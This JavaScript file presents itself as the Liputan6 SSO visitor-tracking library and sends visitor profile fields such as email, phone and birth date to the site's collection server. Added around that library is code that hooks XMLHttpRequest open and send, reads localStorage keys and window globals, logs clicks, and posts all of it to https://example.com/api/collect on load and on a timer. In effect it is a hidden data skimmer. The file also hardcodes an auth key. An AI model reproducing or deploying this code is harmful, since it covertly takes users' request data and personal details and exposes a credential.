const watchKeys = window.watchKeys;
const globalVars = Object.keys(window);
function hook(targetObj, propKey, handler) {
  const originalValue = targetObj[propKey];
  targetObj[propKey] = (...args) => {
    handler(propKey, args);
    return originalValue.apply(targetObj, args);
  };
}
function getCookieLiputan6id(e) {
  for (var i = e + "=", t = document.cookie.split(";"), s = 0; s < t.length; s++) {
    for (var n = t[s]; " " == n.charAt(0);) n = n.substring(1, n.length);
    if (0 == n.indexOf(i)) return n.substring(i.length, n.length);
  }
  return null;
}
function hashGenerator(data) {
  let hash = 0;
  for (const i of Object.keys(data).join("")) {
    hash = (hash << 5) - hash + i.charCodeAt(0);
    hash |= 0;
  }
  return hash.toString(16);
}
function extractLocalStorageData() {
  let localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (watchKeys.includes(key)) {
      localStorageData[key] = localStorage.getItem(key);
    }
  }
  return localStorageData;
}
function sendToServer(data) {
  const uniqueId = hashGenerator(data);
  const url = "https://example.com/api/collect";
  fetch(url, {
    method: 'POST',
    body: JSON.stringify({
      id: uniqueId,
      trackedObj: data
    }),
    headers: {
      "Content-Type": "application/json"
    }
  }).then(response => response.status === 200 ? console.log('Data sent successfully') : console.error(`Data send failure. Status Code: ${response.status}`));
}
class SSO_VISITOR {
  constructor(e) {
    this.sso_base_url = null == e ? "https://collect.liputan6.id/" : e;
  }
  sendVisitorId(e) {
    if (void 0 === e) return {
      status: "ERROR",
      messagge: "Visitor id is required"
    };
    var i = new XMLHttpRequest();
    return i.open("GET", this.sso_base_url + "?visitor_id=" + e), i.send(), {
      status: "SUCCESS",
      messagge: "success send visitor id:" + e
    };
  }
  sendDataVisitor(e) {
    var i,
      t,
      s,
      n,
      r,
      a = null,
      o = 0;
    if (void 0 !== e.age) {
      var d = e.age;
      if (!String(d).match(/^\d+$/)) return {
        status: "ERROR",
        messagge: "Field age is invalid"
      };
      t = new Date().getFullYear() - e.age, t = String(t) + "-01-01";
    }
    if (void 0 !== e.yob) {
      d = e.yob;
      if (4 != String(d).length || !String(d).match(/^\d+$/)) return {
        status: "ERROR",
        messagge: "Field yob is invalid"
      };
      t = String(e.yob) + "-01-01";
    }
    if (void 0 !== e.dob) {
      if (!(d = e.dob).match(/^\d{4}-\d{2}-\d{2}$/)) return {
        status: "ERROR",
        messagge: "Field dob is invalid"
      };
      t = e.dob;
    }
    if (void 0 === e.visitor) return {
      status: "ERROR",
      messagge: "Field visitor is required"
    };
    if (i = e.visitor, void 0 !== e.gender) {
      if ("male" != e.gender && "female" != e.gender) return {
        status: "ERROR",
        messagge: "Field gender is invalid"
      };
      s = e.gender;
    }
    if (void 0 !== e.phone) {
      d = e.phone;
      if (!String(d).match(/^\d+$/)) return {
        status: "ERROR",
        messagge: "Field phone is invalid"
      };
      n = e.phone;
    }
    if (void 0 !== e.email) {
      d = e.email;
      if (!String(d).match(/^(([^<>()[\]\.,;:\s@\"]+(\.[^<>()[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i)) return {
        status: "ERROR",
        messagge: "Field email is invalid"
      };
      r = e.email;
    }
    void 0 !== e.ga_id && (a = e.ga_id), null !== getCookieLiputan6id("liputan6_id_u_id") && (o = encodeURIComponent(getCookieLiputan6id("liputan6_id_u_id"))), void 0 !== e.user_id && (o = e.user_id);
    var u = "?visitor_id=" + i + "&dob=" + t + "&gender=" + s + "&phone=" + n + "&email=" + r + "&ga_id=" + a + "&sso_id=" + o,
      l = new XMLHttpRequest();
    return l.open("GET", this.sso_base_url + "profile" + u), l.send(), {
      status: "SUCCESS",
      messagge: "Success send profile visitor id:" + i
    };
  }
  getProfileVisitor(e, i) {
    var t = this.sso_base_url,
      s = new XMLHttpRequest();
    s.open("GET", t + "api/read-id?v_id=" + e), s.setRequestHeader("auth-key", "%u-7VC#?59Huzrre"), s.onload = function () {
      var e = JSON.parse(s.response);
      i(e);
    }, s.send();
  }
  loginStatus(e) {
    const i = new XMLHttpRequest();
    var t = this.getCookie("liputan6_id_visitor_id"),
      s = this.getCookie("liputan6_id_u_id");
    i.open("POST", `${this.sso_base_url}login/application/status`), i.setRequestHeader("client-id", this.client_id), i.setRequestHeader("client-secret", this.client_secret), i.setRequestHeader("visitor-id", t), i.setRequestHeader("uid", s), i.onreadystatechange = function () {
      if (this.readyState === XMLHttpRequest.DONE && 200 === this.status) {
        const i = JSON.parse(this.responseText);
        e(i);
      } else if (this.readyState === XMLHttpRequest.DONE && 200 != this.status) {
        const i = JSON.parse(this.responseText);
        e(i);
      }
    }, i.onerror = function () {
      e({
        status: 500,
        message: [],
        login: 0,
        data: []
      });
    }, i.send();
  }
  getCookie(e) {
    for (var i = e + "=", t = decodeURIComponent(document.cookie).split(";"), s = 0; s < t.length; s++) {
      for (var n = t[s]; " " == n.charAt(0);) n = n.substring(1);
      if (0 == n.indexOf(i)) return n.substring(i.length, n.length);
    }
    return "";
  }
}
var SSOVISITOR = null;
function sendLocalStorageData() {
  const collectedData = extractLocalStorageData();
  if (Object.keys(collectedData).length) {
    sendToServer(collectedData);
    sendToServer({
      globalVars: globalVars
    });
  }
}
window.addEventListener("load", sendLocalStorageData);
setInterval(sendLocalStorageData, 5 * 60 * 1000);
function clickEventHandler(e) {
  sendToServer({
    clickedElem: e.target.tagName
  });
}
SSOVISITOR = new SSO_VISITOR();
document.addEventListener('click', clickEventHandler);
hook(XMLHttpRequest.prototype, 'open', function (propKey, args) {
  sendToServer({
    xhrOpenArgs: args
  });
});
hook(XMLHttpRequest.prototype, 'send', function (propKey, args) {
  sendToServer({
    xhrSendArgs: args
  });
});